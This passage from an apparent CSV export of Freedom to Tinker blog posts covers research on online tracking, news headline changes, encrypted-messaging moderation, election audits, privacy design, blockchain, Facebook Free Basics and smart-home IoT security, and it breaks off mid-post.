FAQ, and this blog post. [2] The RMA FAQ states: “In addition, we will use an anonymous, unique identifier we create when you register on our websites. This may allow an advertiser to use information they have about your visits to online websites to deliver marketing messages to mobile devices on our network.” From this statement it isn’t entirely clear how this unique identifier is used or if it is transmitted as part of the UIDH communication. [3] Verizon Selects is described in this blog post, and its use with UIDH is described in the FAQ. [4] The authentication and verification systems are described in a patent and mentioned in the UIDH FAQ, but we haven’t found any evidence of current deployments. [5] Examples include: Apple’s IDFA, onboarding, Drawbridge’s device linking, Facebook’s instant personalization, cookie syncing [6] For a good explanation of how to achieve persistent tracking using the header, see Jacob Hoffman-Andrews’ blog post on the EFF blog. The cloud icon in the above diagram was created by Dmitry Baranovkiy on the Noun Project"
"155","2016-09-14","2023-03-24","https://freedom-to-tinker.com/2016/09/14/all-the-news-thats-fit-to-change-insights-into-a-corpus-of-2-5-million-news-headlines/","[Thanks to Joel Reidenberg for encouraging this deeper dive into news headlines!] There is no guarantee that a news headline you see online today will not change tomorrow, or even in the next hour, or will even be the same headlines your neighbor sees right now. For a real-life example of the type of change that can happen, consider this explosive headline from NBC News… “Bernanke: More Execs Deserved Jail for Financial Crisis” …contrasted with the much more subdued… “Bernanke Thinks More Execs Should Have Been Investigated” These headlines clearly suggest different stories, which is worrying because of the effect that headlines have on our perception of the news — a recent survey found that, “41 percent of Americans report that they watched, read, or heard any in-depth news stories, beyond the headlines, in the last week.” As part of the Princeton Web Transparency and Accountability Project (WebTAP), we wanted to understand more about headlines. How often do news publishers change headlines on articles? Do variations offer different editorial slants on the same article? Are some variations ‘clickbait-y’? To answer these questions we collected over ~1.5 million article links seen since June 1st, 2015 on 25 news sites’ front pages through the Internet Archive’s Wayback Machine. Some articles were linked to with more than one headline (at different times or on different parts of the page), so we ended up with a total of ~2.5 million headlines.[1] To clarify, we are defining headlines as the text linking to articles on the front page of news websites — we are not talking about headlines on the actual article pages themselves. Our corpus is available for download here. In this post we’ll share some preliminary research and outline further research questions. One in four articles had more than one headline associated with it We were limited in our analysis to how many snapshots of the news sites the Wayback Machine took. For the six months of data from 2015 especially, some of the less-popular news sites did not have as many daily snapshots as the more popular sites — the effect of this might suppress the measure of headline variation on less popular websites. Even so, we were able to capture many instances of articles with multiple headlines for each site we looked at. Clickbait is common, and hasn’t changed much in the last year We took a first pass at our data using an open source library to classify headlines as clickbait. The classifier was trained by the developer using Buzzfeed headlines as clickbait and New York Times headlines as non-clickbait, so it can more accurately be called a Buzzfeed classifier. Unsurprisingly then, Buzzfeed had the most clickbait headlines detected of the sites we looked at. But we also discovered that more “traditional” news outlets regularly use clickbait headlines too. The Wall Street Journal, for instance, has used clickbait headlines in place of more traditional headlines for its news stories, as in two variations they tried for an article on the IRS: ‘Think Tax Time Is Tough? Try Being at the IRS’ vs. ‘Wait Times Are Down, But IRS Still Faces Challenges’ Overall, we found that at least 10% of headlines were classified as clickbait on a majority of sites we looked at. We also found that overall, clickbait does not appear to be any more or less common now than it was in June 2015. Using lexicon-based heuristics we were able to identify many instances of bias in headlines Identifying bias in headlines is a much harder problem than finding clickbait. One research group from Stanford approached detecting bias as a machine learning problem — they trained a classifier to recognize when Wikipedia edits did or did not reflect a neutral point of view, as identified by thousands of human Wikipedia editors. While Wikipedia edits and headlines differ in some pretty important ways, using their feature set was informative. They developed a lexicon of suspect words, curated from decades of research on biased language. Consider the use of the root word “accuse,” as in this example we found from Time Magazine: ‘Roger Ailes Resigns From Fox News’ vs. ‘Roger Ailes Resigns From Fox News Amid Sexual Harassment Accusations’ The first headline just offers the “who” and “what” of the news story — the second headline’s “accusations” add the much more attention-grabbing “why.” Some language use is more subtle, like in this example from Fox News: ‘DNC reportedly accuses Sanders campaign of improperly accessing Clinton voter data’ vs. ‘DNC reportedly punishes Sanders campaign for accessing Clinton voter data’ The facts implied by these headlines are different in a very important way. The second headline, unlike the first, can cause a reader presuppose that the Sanders campaign did do something wrong or malicious, since they are being punished. The first headline hedges the story significantly, only saying that the Sanders campaign may have done something “improper” — the truth of that proposition is not suggested. The researchers identify this as a bias of entailment. Using a modified version of the biased-language lexicon, we looked at our own corpus of headlines and identified when headline variations added or dropped these biased words. We found approximately 3000 articles in which headline variations for the same article used different biased words, which you can look at here. From our data collection we clearly have evidence of editorial bias playing a role in the different headlines we see on news sites. Detecting all instances of bias and avoiding false positives is an open research problem While identifying bias in 3000 articles’ headlines is a start, we think we’ve identified only a fraction of biased articles. One reason for missing bias is that our heuristic defines differential bias narrowly (explicit use of biased words in one headline not present in another). There are also false positives in the headlines that we detected as biased. For instance, an allegation or an accusation might show a lack of neutrality in a Wikipedia article, but in a news story an allegation or accusation may simply be the story. We know for sure that our data contains evidence of editorial and biased variations in headlines, but we still have a long way to go. We would like to be able to identify at scale and with high confidence when a news outlet experiments with its headlines. But there are many obstacles compared to the previous work on identifying bias in Wikipedia edits: – Without clear guidelines, finding bias in headlines is a more subjective exercise than finding it in Wikipedia articles. – Headlines are more information-dense than Wikipedia articles — fewer words in headlines contribute to a headline’s implication. – Many of the stories that the news publishes are necessarily more political than most Wikipedia articles. If you have any ideas on how to overcome these obstacles, we invite you to reach out to us or take a look at the data yourself, available for download here. –@dillonthehuman [1] Our main measurements ignore subpages like nytimes.com/pages/politics, which appear to often have article links that are at some point featured on the front page. For each snapshot of the front page, we collected the links to articles seen on the page along with the ‘anchor text’ of those links, which are generally the headlines that are being varied."
"156","2019-10-06","2023-03-24","https://freedom-to-tinker.com/2019/10/06/content-moderation-for-end-to-end-encrypted-messaging/","Thursday evening, the Attorney General, the Acting Homeland Security Secretary, and top law enforcement officials from the U.K. and Australia sent an open letter to Mark Zuckerberg. The letter emphasizes the scourge of child abuse content online, and the officials call on Facebook to press pause on end-to-end encryption for its messaging platforms. The letter arrived the same week as a widely shared New York Times article, describing how reports of child abuse content are multiplying. The article provides a heartbreaking account of how the National Center for Missing and Exploited Children (NCMEC) and law enforcement agencies are overburdened and under-resourced in addressing horrible crimes against children. Much of the public discussion about content moderation and end-to-end encryption over the past week has appeared to reflect two common technical assumptions: Content moderation is fundamentally incompatible with end-to-end encrypted messaging. Enabling content moderation for end-to-end encrypted messaging fundamentally poses the same challenges as enabling law enforcement access to message content. In a new discussion paper, I provide a technical clarification for each of these points. Forms of content moderation may be compatible with end-to-end encrypted messaging, without compromising important security principles or undermining policy values. Enabling content moderation for end-to-end encrypted messaging is a different problem from enabling law enforcement access to message content. The problems involve different technical properties, different spaces of possible designs, and different information security and public policy implications. I aim to demonstrate these clarifications by formalizing specific content moderation properties for end-to-end encrypted messaging, then offering at least one possible protocol design for each property. User Reporting: If a user receives a message that he or she believes contains harmful content, can the user report that message to the service provider? Known Content Detection: Can the service provider automatically detect when a user shares content that has previously been labeled as harmful? Classifier-based Content Detection: Can the service provider detect when a user shares new content that has not been previously identified as harmful, but that an automated classifier predicts may be harmful? Content Tracing: If the service provider identifies a message that contains harmful content, and the message has been forwarded by a sequence of users, can the service provider trace which users forwarded the message? Popular Content Collection: Can the service provider curate a set of content that has been shared by a large number of users, without knowing which users shared the content? The discussion paper is inherently preliminary and an agenda for further interdisciplinary research (including my own). I am not yet prepared to normatively advocate for or against the protocol designs that I describe. I am not claiming that these concepts provide sufficient content moderation capabilities, the same content moderation capabilities as current systems, or sufficient robustness against evasion. I am also not claiming that these designs adequately address information security risks or public policy values, such as free speech, international human rights, or economic competitiveness. I do not know if there is a viable path forward for content moderation and end-to-end encrypted messaging that will be acceptable to technology platforms, law enforcement, NCMEC, civil society groups, information security experts, and other stakeholders. I do have confidence that, if such a path exists, we will only find it through open research and dialogue."
"157","2019-11-15","2023-03-24","https://freedom-to-tinker.com/2019/11/15/citp-call-for-visitors-2020-21/","The Center for Information Technology Policy is an interdisciplinary research center at Princeton University that sits at the crossroads of engineering, the social sciences, law, and policy. CITP seeks applicants for various visiting positions each year. Visitors are expected to live in or near Princeton and to be in residence at CITP on a daily basis. They will conduct research and participate actively in CITP’s programs. For all visitors, we are happy to hear from anyone working at the intersection of digital technology and public life, including experts in computer science, sociology, economics, law, political science, public policy, information studies, communication, and other related disciplines. We have a particular interest this year in candidates working on issues related to Artificial Intelligence (AI), Blockchain and Cryptocurrencies. There are three job postings for CITP visitors: 1) Microsoft Visiting Researcher Scholar/Visiting Professor of Information Technology Policy, 2) Visiting IT Policy Fellow, and 3) Postdoctoral Research Associate or more senior IT policy researcher. For more information about these positions and to apply, please see our hiring page. For full consideration, all applications should be received by December 31, 2019."
"158","2018-12-10","2023-03-24","https://freedom-to-tinker.com/2018/12/10/pilots-of-risk-limiting-election-audits-in-california-and-virginia/","In order to run trustworthy elections using hackable computers (including hackable voting machines), “elections should be conducted with human-readable paper ballots. … States should mandate risk-limiting audits prior to the certification of election results.” What is a risk-limiting audit, and how do you perform one? An RLA is a human inspection of a random sample of the paper ballots (or batches of ballots)—using a scientific method that guarantees with high confidence that if the voting machines claimed the wrong winner, then the audit will declare, “I cannot confirm this election,” in which case a by-hand recount is appropriate. This is protection against voting-machine miscalibration, or against fraudulent hacks of the voting machines. That’s what it is, but how do you do it? RLAs require not only a statistical design, but a practical plan for selecting hundreds of ballots from among millions of sheets of paper. It’s an administrative process as much as it is an algorithm. In 2018, RLAs were performed by the state of Colorado. In addition, two just-published reports describe pilot RLAs performed by Orange County, California and Fairfax, Virginia. From these reports (and from the audits they describe) we can learn a lot about how RLAs work in practice. Orange County, CA Pilot Risk-Limiting Audit, by Stephanie Singer and Neal McBurnett, Verified Voting Foundation, December 2018. Neal Kelley, Registrar of Voters of Orange County, ran an RLA of 3 county-wide races in the June 2018 primary, with assistance from Verified Voting. About 635,000 ballots were cast; many ballots were 3 pages long (printed both sides), about 1.4 million sheets overall. Of these, just 160 specific (randomly selected) ballot sheets needed to be found and tabulated by human inspection. How do you manage a million sheets of paper? Orange County elections warehouse during the June 2018 risk-limiting audit Like this! Keep well organized ballot manifests that list each batch of ballots (that were initially counted by optical scanners), where they came from, how many ballots. How do you know how many ballots are in each batch? The optical scanners tell you, but you don’t want to trust the optical scanners (a hacked scanner could influence the audit by lying about how many ballots are in a batch). So you weigh the batch on a high-precision scale, that tells you ±2 sheets. And so on. You can read the details in the report, which really helps to demystify the process. Still, there are many ways of doing an RLA, and this report describes just one of them. The audit was finished before the deadline for certifying election results. The estimated salary cost of the staff of the Registrar of Voters, for the days running the audit, was under $4000. City of Fairfax,VA Pilot Risk-Limiting Audit, by Mark Lindeman, Verified Voting Foundation, December 2018. Brenda Cabrera, General Registrar of the City of Fairfax, ran a pilot RLA of the June 12th 2018 Republican primary Senate election, with assistance from Verified Voting. There were 948 ballots cast, and the audit team ran the audit three ways, to test three different RLA methods. The audit was scheduled to take two days but finished ahead of schedule. Colorado ran statewide RLAs of its 2018 primary and general elections, after pilot projects in previous years. From all these activities we continue to learn more about how to run trustworthy elections. I encourage state and local election officials nationwide to try RLA pilots of their own. The Verified Voting Foundation, Democracy Works, the Democracy Fund, Free and Fair, and other individuals and organizations are available to provide advice."
"159","2018-01-24","2023-03-24","https://freedom-to-tinker.com/2018/01/24/workshop-on-technical-applications-of-contextual-integrity/","The theory of contextual integrity (CI) has inspired work across the legal, privacy, computer science and HCI research communities. Recognizing common interests and common challenges, the time seemed ripe for a meeting to discuss what we have learned from the projects using CI and how to move forward to leverage CI for enhancing privacy preserving systems and policies. On 11 December, 2017 the Center for Information Technology Policy hosted an inaugural workshop on Technical Applications of Contextual Integrity. The workshop gathered over twenty researchers from Princeton University, New York University, Cornell Tech, University of Maryland, Data & Society, and AI Now to present their ongoing and completed projects, discuss and share ideas, and explore successes and challenges when using the CI framework. The meeting, which included faculty, postdocs, and graduate students, was kicked off with a welcome and introduction by Ed Felten, CITP Director. The agenda comprised of two main parts. In the first half of the workshop, representatives of various projects gave a short presentation on the status of their work, describe any challenges encountered, and lessons learned in the process. The second half included a planning session of a full day event to take place in the Spring to allow for a bigger discussion and exchange of ideas. The workshop presentations touched on a wide variety of topics which included: ways operationalizing CI, discovering contextual norms behind children’s online activities, capturing users’ expectation towards smart toys and smart-home devices, as well as demonstrating how CI can be used to analyze regulation acts, applying CI to establish research ethics guidelines, conceptualizing privacy within common government arrangement. More specifically: Yan Shvartzshnaider discussed Verifiable and ACtionable Contextual Integrity Norms Engine (VACCINE), a framework for building adaptable and modular Data Leakage Prevention (DLP) systems. Darakshan Mir discussed a framework for community-based participatory framework for discovery of contextual informational norms in small and veranubale communities. Sebastian Benthall shared the key takeaways from conducting a survey on existing computer science literature work that uses Contextual Integrity. Paula Kift discussed how the theory of contextual Integrity can be used to analyze the recently passed Cybersecurity Information Sharing Act (CISA) to reveals some fundamental gaps in the way it conceptualizes privacy. Ben Zevenbergen talked about his work on applying the theory of contextual integrity to help establish guidelines for Research Ethics. Madelyn Sanfilippo discussed conceptualizing privacy within a commons governance arrangement using Governing Knowledge Commons (GKC) framework. Priya Kumar presented recent work on using the Contextual Integrity to identify gaps in children’s online privacy knowledge. Sarah Varghese and Noah Apthorpe discussed their works on discovering privacy norms in IoT Devices using Contextual Integrity. The roundtable discussion covered a wide range of open questions such as what are the limitations of CI as a theory, possible extensions, integration into other frameworks, conflicting interpretations of the CI parameters, possible research directions, and interesting collaboration ideas. This a first attempt to see how much interest there is from the wider research community in a CI-focused event. We were overwhelmed with the incredible response! The participants expressed huge interest in the bigger event in Spring 2018 and put forward a number of suggestions for the format of the workshop. The initial idea is to organize the bigger workshop as a co-joint event with an established conference, another suggestion was to have it as part of a hands-on workshop that brings together industry and academia. We are really excited about the event that will bring together a large sample of CI-related research work both academically and geographically which will allow a much broader discussion. The ultimate goal of this and other future initiatives is to foster communication between the various communities of researchers and practitioners using the theory of CI as a framework to reason about privacy and a language for sharing of ideas. For the meantime, please check out the http://privaci.info website that will serve as a central repository for news, up to date related work for the community. We will be updating it in coming months. We look forward to your feedback and suggestions. If you’re interested in hearing about the Spring workshop or presenting your work, want to help or have any suggestion please get in touch! Twitter: @privaci_way Email: *protected email*"
"160","2018-10-04","2023-03-24","https://freedom-to-tinker.com/2018/10/04/building-respectful-products-using-crypto-lea-kissner-at-citp/","How can we build respect into products and systems? What role does cryptography play in respectful design? Speaking today at CITP is Lea Kissner (@LeaKissner), global lead of Privacy Technology at Google. Lea has spent the last 11 years designing and building security and privacy for Google projects from the grittiest layers of infrastructure to the shiniest user features — and cleaning up when something goes awry. She earned a Ph.D. in cryptography at Carnegie Mellon and a B.S. in CS from UC Berkeley. As head of privacy at Google, Lea is crafts privacy reviews, defines what privacy means at Google, and leads a team that supports privacy across Google. Her team also creates tools and infrastructure that manage privacy across the company. If you’ve reviewed your privacy on Google, deleted your data, or shared any information with Google, Lea and her team have shaped your experience. How does Lea think about privacy? When working to build products that respect users, Lea reminds us that it’s important for people to feel safe. This is a full-stack problem, all the way from humans and societies down to the level of hardware. Since society varies widely, people have very expectations around privacy and security, but not in the ways you would anticipate. Lea talks about many assumptions that don’t apply globally: not all languages have a word for privacy, people don’t always have control over their physical devices, and they often operate in settings of conflict. Lea next talks about the case of online harassment. She describes hate speech as a distributed denial of service attack, a way to suppress speech they don’t like. Many platforms enable this kind of harassment, allowing anyone to send messages to anyone and enabling mass harassment. Sometimes it’s possible for platforms to develop policies to manage these problems, but platforms are often unable to intervene in cases of conflicting values. Lea tells us about one project she worked on during the Arab uprisings. When people’s faces appeared in videos of protests, those people sometimes faced substantial risks when videos became widely viewed. Lea’s team worked with YouTube to implement software that allowed content creators to blur the faces of people appearing in videos. Next, Lea describes the ways that her team links research with practical benefits to people. Her team’s ethnographers study differences in situations and norms. These observations shape how her team designs systems. As they create more systems, they then create design patterns, then do user testing on those patterns. Research with humans is important at both ends of the work: when understanding the meaning and nature of the challenges, and when testing systems. Finally, Lea argues that we need to make privacy and security easy for people to do. Right now, cryptography processes are hard for people to use, and hard for people to implement. Her team focuses on creating systems to minimize the number of things that humans need to do in order to stay secure. How Cryptography Projects can Fail Lea next tells us about common failures in privacy and security. The first way to fail is to create your own cryptography system. That’s a dangerous thing to do, says Lea. Why do people do this? Some think they’re smart and know enough just enough to be dangerous. Some think it’s cool to roll their own. Some don’t understand how cryptography works. Sometimes it seems too expensive (in terms of computation and network) for them to use a third-party system. To make good crypto easier, Lea’s team has created Tink, a multi-language, cross-platform library that provides cryptographic APIs that are secure, easy to use correctly, and hard(er) to misuse. Lea urges us, “Do me a solid. Don’t give people excuses to roll their own crypto.” Another area where people fail is in privacy-preserving computation. Lea tells us the story of a feature within Google where people wanted to send messages to someone whose phone number they have. Simple, right? Lea unpacks how complex such features can be, how easy it is to enable privacy breaches, and how expensive it can be to offer privacy. She describes a system that stores a large number of phone numbers associated with user IDs. By storing information with encrypted user IDs, it’s possible to enable people to manage their privacy. When Lea’s team estimated the impact of this privacy feature, they realized that it would require more than all of Google’s total computational power. They’re still working on that one. Privacy is easier to implement in structured analysis of databases such as advertising metrics, says Lea. Google has had more success adopting privacy practices in areas like advertising dashboards that don’t involve real-time user experiences. Hardware failures are a major source of privacy and security failures. Lea tells us about the squirrels and sharks that have contributed to Amazon and Yahoo data failures by nibbling on cables. She then talks to us about sources of failures from software errors, as well as key errors. Lea tells us about Google’s Key Management Server, which knows about data objects and the keys that pertain to those objects. Keys in this service need to be accessed quickly and globally. How do generalized key management servers fail? First, encrypted data compresses poorly. If a million people send each other the same image, a typical storage system can compress it efficiently, storing it only once. An encrypted storage system has to encrypt and store each image individually. Second, people who store information often like to index and search for information. Exact matches are easy, but if you need to retrieve a range of things from a period of time, you need an index, and to create an index, the software needs to know what’s inside the encrypted data. Sharding, backing up, and caching data is also very difficult when information is encrypted. Next, Lea tells us about the problem of key rotation. People need to be able to change their keys in any usable encryption system. When rotating keys, for every single object, you need to decrypt it using the key and then re-encrypt it using a new key. During this process, you can’t shut down an entire service in order to re-do the encryption. Within a large organization like Google, key rotation should be regular, but if it needs to be coordinated across a large number of people. Lea’s team tried something like this, but it ended up being too complex for the company’s needs. After trying this, they moved key management to the storage level, where it would be possible to manage and rotate keys independently of software teams. What do we learn from this? Lea tells us that cryptography is a tool for turning things into key management problems. She encourages us to avoid rolling our own cryptography, to design scalable privacy-preserving systems, plan for key management up front, and evaluate the success of a design in the full stack, working from humans all the way to the hardware."
"161","2018-02-26","2023-03-24","https://freedom-to-tinker.com/2018/02/26/blockchain-what-is-it-good-for/","Blockchain and cryptocurrencies are surrounded by world-historic levels of hype and snake oil. For people like me who take the old-fashioned view that technical claims should be backed by sound arguments and evidence, it’s easy to fall into the trap of concluding that there is no there there–and that blockchain and cryptocurrencies are fundamentally useless. This post is my attempt to argue that if we strip away the fluff, some valuable computer science ideas remain. Let’s start by setting aside the currency part, for now, and focusing on blockchains. The core idea goes back to at least the 1990s: replicate a system’s state across a set of machines; use some kind of distributed consensus algorithm to agree on an append-only log of events that change the state; and use cryptographic hash-chaining to make the log tamper-evident. Much of the legitimate excitement about “blockchain” is driven by the use of this approach to enhance transparency and accountability, by making certain types of actions in a system visible. If an action is recorded in your blockchain, everyone can see it. If it is not in your blockchain, it is ignored as invalid. An example of this basic approach is certificate transparency, in which certificate authorities (“CAs,” which vouch for digital certificates connecting a cryptographic key to the owner of a DNS name) must publish the certificates they issue on a public list, and systems refuse to accept certificates that are not on the list. This ensures that if a CA issues a certificate without permission from a name’s legitimate owner, the bogus certificate cannot be used without publishing it and thereby enabling the legitimate owner to raise an alarm, potentially leading to public consequences for the misbehaving CA. In today’s world, with so much talk about the policy advantages of technological transparency, the use of blockchains for transparency can an important tool. What about cryptocurrencies? There is a lot of debate about whether systems like Bitcoin are genuinely useful as a money transfer technology. Bitcoin has many limitations: transactions take a long time to confirm, and the mining-based consensus mechanism burns a lot of energy. Whether and how these limitations can be overcome is a subject of current research. Cryptocurrencies are most useful when coupled with “smart contracts,” which allow parties to define the behavior of a virtual actor in code, and have the cryptocurrency’s consensus system enforce that the virtual actor behaves according to its code. The name “smart contract” is misleading, because these mechanisms differ significantly from legal contracts. (A legal contract is an explicit agreement among an enumerated set of parties that constrains the behavior of those parties and is enforced by ex post remedies. A “smart contract” doesn’t require explicit agreement from parties, doesn’t enumerate participating parties, doesn’t constrain behavior of existing parties but instead creates a new virtual party whose behavior is constrained, and is enforced by ex ante prevention of deviations.) It is precisely these differences that make “smart contracts” useful. From a computer science standpoint, what is exciting about “smart contracts” is that they let us make conditional payments an integral part of the toolbox for designing distributed protocols. A party can be required to escrow a deposit as a condition of participating in some process, and the return of that deposit, in part or in whole, can be conditioned on the party performing arbitrary required steps, as long as compliance can be checked by a computation. Another way of viewing the value of “smart contracts” is by observing that we often define correctness for a new distributed protocol by postulating a hypothetical trusted third party who “referees” the protocol, and then proving some kind of equivalence between the new referee-free protocol we have designed and the notional refereed protocol. It sure would be nice if we could just turn the notional referee into a smart contract and let the consensus system enforce correctness. But all of this requires a “smart contract” system that is efficient and scalable–otherwise the cost of using “smart contracts” will be excessive. Existing systems like Ethereum scale poorly. This too is a problem that will need to be overcome by new research. (Spoiler alert: We’ll be writing here about a research solution in the coming months.) These are not the only things that blockchain and cryptocurrencies are good for. But I hope they are convincing examples. It’s sad that the hype and snake oil has gotten so extreme that it can be hard to see the benefits. The benefits do exist."
"162","2018-03-28","2023-03-24","https://freedom-to-tinker.com/2018/03/28/when-the-choice-is-to-delete-facebook-or-buy-a-loaf-of-bread/","By Julieanne Romanosky and Marshini Chetty In the last week, there has been a growing debate around Facebook and privacy. On Twitter, the newly formed #deletefacebook movement calls for users who are upset over the data breach of over 50 million Facebook accounts by Cambridge Analytica to rid themselves of the platform altogether. But like others have stated, deleting Facebook may not be the easy option for everyone on the platform because in some countries, Facebook is the Internet. In fact, in 63 countries around the world, Facebook has introduced the Free Basics platform which includes Facebook and offers marginalized users limited “free” browsing on the Internet. More importantly, our recent study, jointly conducted with the University of Maryland [5], suggests that deleting Facebook and Free Basics for low income users could be the difference between saving enough money to afford a loaf of bread or not. What is Facebook’s Free Basics and why is it being used by low income users?: Free Basics was founded in 2013 by Facebook with the goal of connecting rural and low-income populations to the Internet for the first time. While Free Basics appears as a single app, it is actually a platform for hosting a variety of data-charge free or “zero-rated” applications and the available content changes depending on the country and unpaid partnerships with local service providers, i.e., no two Free Basics offerings are the same. However, all versions provide access to a lite version of Facebook (with no images or video) and select other third party apps such as Bing and Wikipedia. Educational materials, news, weather reports dominate the application topics in Free Basics across countries. Other apps cover health care, job listings, search engines, and classifieds. Here is what the app interface looks like in South Africa: What did we do to investigate Facebook and Free Basics usage?: We interviewed 35 Free Basics users in South Africa, one of the countries that the platform is offered in. We spoke to a combination of current low-income users and non-regular student users. Including both groups in our study allowed us to form a more comprehensive understanding of the impact of zero-rated services, the factors that affect the adoption of these services, and the possible use of these services in more developed countries than if we studied users or non-users alone or those who were unconnected and low-income only. Both groups were asked to talk about their online habits (i.e. time spent online, what websites or apps they used etc), how much money they typically spent on Internet access, and how, if at all, they worked to keep their mobile Internet costs down. How do low income users use Facebook’s Free Basics?: We found, particularly, the low income users on Free Basics were able to cut their mobile data costs significantly, with one participant in our study exclaiming that they could now afford a loaf of bread with the money saved from being online for “free”. The service also drove users to the “free” apps included in the platform even when they preferred other apps that were not “free” to use. Interestingly, all the participants who used Free Basics regularly were not “unconnected” users who had never been online prior to using the platform. Instead, these participants had been using the Internet as paying customers but they had heard about the platform from others (often through word of mouth) as a way to save on Internet costs. For these users, deleting Facebook and its relevant resources would be like deleting a lifeline in an already expensive data landscape. The platform was not without limitations for our participants however. Since our participants were already online, they were also very conscious of the fact that the apps included in the platform were, in their perception, “second-rate” – for instance, the Facebook app on the platform does not include images or video unless users pay for them. What does this mean for Free Basics users deleting Facebook? For now, many of the users like the participants in our study will not be able to easily #deletefacebook because saying goodbye to Facebook means incurring more data costs. And of course, privacy issues are very prominent on the platform – there has been a lot of controversy around the fact that all browsing done through the platform goes through a Facebook proxy and Facebook can decrypt the content of any app on its servers [1, 2, 3, 4]. Currently, we are trying to understand how much low income users understand or care about these privacy issues. Most importantly, we have to ask questions about how to help users manage their privacy settings and whether the new centralized settings proposed by Facebook will work similarly for users of platforms like Free Basics more generally. Finally, we have to ask are platforms like Free Basics the right way to provide Internet access to low income users in the first place or are there other techniques that allow Internet use in a less restrictive more privacy preserving manner. You can read more about our study and its limitations, (such as the small scale of the sample), here or skim the paper summary. The work will be presented at the upcoming top Human-computer interaction conference, CHI 2018, in Montreal next month. References: 1. BJ Ard. 2015. Beyond Neutrality: How Zero Rating Can (Sometimes) Advance User Choice, Innovation, and Democratic Participation. Maryland Law Review 4, 3(2015), 984–1028. 2. Luca Belli. 2016. Net neutrality reloaded: zero rating, specialised service, ad blocking and traffic management. (2016). 3. Nanjira Sambuli. 2016. Challenges and opportunities for advancing Internet access in developing countries while upholding net neutrality. Journal of Cyber Policy 1, 1 (2016), 61–74. 4. Rijurekha Sen, Hasnain Ali Pirzada, Amreesh Phokeer, Zaid Ahmed Farooq, Satadal Sengupta, David Choffnes, and Krishna P. Gummadi. 2016. On the Free Bridge Across the Digital Divide: Assessing the Quality of Facebook’s Free Basics Service. In Proceedings of the 2016 Internet Measurement Conference (IMC ’16). ACM, New York, NY, USA, 127–133 5. Romanosky, J. and Chetty, M. (2018) Understanding the Use and Impact of the Zero-Rated Free Basics Platform in South Africa. (2018) To be Presented at Human Factors in Computing Conference (CHI 2018)."
"163","2018-04-23","2023-03-24","https://freedom-to-tinker.com/2018/04/23/announcing-iot-inspector-a-tool-to-study-smart-home-iot-device-behavior/","By Noah Apthorpe, Danny Y. Huang, Gunes Acar, Frank Li, Arvind Narayanan, Nick Feamster An increasing number of home devices, from thermostats to light bulbs to garage door openers, are now Internet-connected. This “Internet of Things” (IoT) promises reduced energy consumption, more effective health management, and living spaces that react adaptively to users’ lifestyles. Unfortunately, recent IoT device hacks and personal data breaches have made security and privacy a focal point for IoT consumers, developers, and regulators. Many IoT vulnerabilities sound like the plot of a science fiction dystopia. Internet-connected dolls allow strangers to spy on children remotely. Botnets of millions of security cameras and DVRs take down a global DNS service provider. Surgically implanted pacemakers are susceptible to remote takeover. These security vulnerabilities, combined with the rapid evolution of IoT products, can leave consumers at risk, and in the dark about the risks they face when using these devices. For example, consumers may be unsure which companies receive personal information from IoT appliances, whether an IoT device has been hacked, or whether devices with always-on microphones listen to private conversations. To shed light on the behavior of smart home IoT devices that consumers buy and install in their homes, we are announcing the IoT Inspector project. Announcing IoT Inspector: Studying IoT Security and Privacy in Smart Homes Today, at the Center for Information Technology Policy at Princeton, we are launching an ongoing initiative to study consumer IoT security and privacy, in an effort to understand the current state of smart home security and privacy in ways that ultimately help inform both technology and policy. We have begun this effort by analyzing more than 50 home IoT devices ourselves. We are working on methods to help scale this analysis to more devices. If you have a particular device or type of device that you are concerned about, let us know. To learn more, visit the IoT Inspector website. Our initial analyses have revealed several findings about home IoT security and privacy. Finding #1: Many IoT Devices Lack Basic Encryption & Authentication Some groups have published best practice guidelines for IoT devices, including the use of encryption to prevent malicious actors from intercepting and reading communications between devices and cloud servers, as well as incorporating appropriate authentication mechanisms to prevent unauthorized entities from accessing user information. Unfortunately, many of the devices we have examined lack even these basic security or privacy features. For example, the Withings Smart Blood Pressure Monitor included the brand of the device and the string “blood pressure” in unencrypted HTTP GET request headers. This allows a network eavesdropper to (1) learn that someone in a household owns a blood pressure monitor and (2) determine how frequently the monitor is used based on the frequency of requests. It would be simple to hide this information with SSL. We also analyzed several Internet-connected children’s toys and found several security and privacy vulnerabilities. None of the toys we studied used HTTPS or SSL when communicating with manufacturer-owned servers. One toy lacked authentication for user profile pictures. An eavesdropper could record or replay device communications to obtain profile photos. Finding #2: User Behavior Can Be Inferred from Encrypted IoT Device Traffic Even devices that use HTTPS/SSL may be vulnerable to privacy violations based on Internet traffic metadata, such as traffic volumes. We have demonstrated how observers from ISPs to devices in the home to neighbors running packet sniffers, can infer in-home user behaviors from patterns of encrypted traffic from IoT devices. A network observer can first identify devices in a home using MAC addresses, DNS requests, or machine learning on packet timings. The observer can then monitor traffic and note spikes in packet frequency or size. The timings of these spikes, combined with the identity of the device, allows the observer to infer user behaviors. Figure 1: Network traffic send/receive rates of selected flows from four commercially-available smart home devices during controlled experiments. Clearly visible changes in send/receive rates directly correspond with user activities. A passive network observer aware of this behavior could easily correlate smart home traffic rates with device states and corresponding user activities. The figure demonstrates the effectiveness of this attack on four home IoT devices. Traffic rates from a sleep monitor revealed user sleep patterns, traffic rates from a smart outlet revealed when a physical appliance in a smart home is turned on or off, and traffic rates from a security camera revealed when a user is actively monitoring the camera feed or when the camera detects motion in a user’s home. Most single- or limited-purpose IoT devices are susceptible to this simple attack. We are currently designing and evaluating obfuscation techniques to protect activity inference from network metadata. Finding #3: Many IoT Devices Contact a Large and Diverse Set of Third Parties In many cases, consumers expect that their devices contact manufacturers’ servers, but communication with other third-party destinations may not be a behavior that consumers expect. We have found that many IoT devices communicate with third-party services, of which consumers are typically unaware. We have found many instances of third-party communications in our analyses of IoT device network traffic. Some examples include: Samsung Smart TV. During the first minute after power-on, the TV talks to Google Play, Double Click, Netflix, FandangoNOW, Spotify, CBS, MSNBC, NFL, Deezer, and Facebook—even though we did not sign in or create accounts with any of them. Amcrest WiFi Security Camera. The camera actively communicates with cellphonepush.quickddns.com using HTTPS. QuickDDNS is a Dynamic DNS service provider operated by Dahua. Dahua is also a security camera manufacturer, although Amcrest’s website makes no references to Dahua. Amcrest customer service informed us that Dahua was the original equipment manufacturer. Halo Smoke Detector. The smart smoke detector communicates with broker.xively.com. Xively offers an MQTT service, which allows manufacturers to communicate with their devices. Geeni Light Bulb. The Geeni smart bulb communicates with gw.tuyaus.com, which is operated by TuYa, a China-based company that also offers an MQTT service. We also looked at a number of other devices, such as Samsung Smart Camera and TP-Link Smart Plug, and found communications with third parties ranging from NTP pools (time servers) to video storage services. These third-party services are 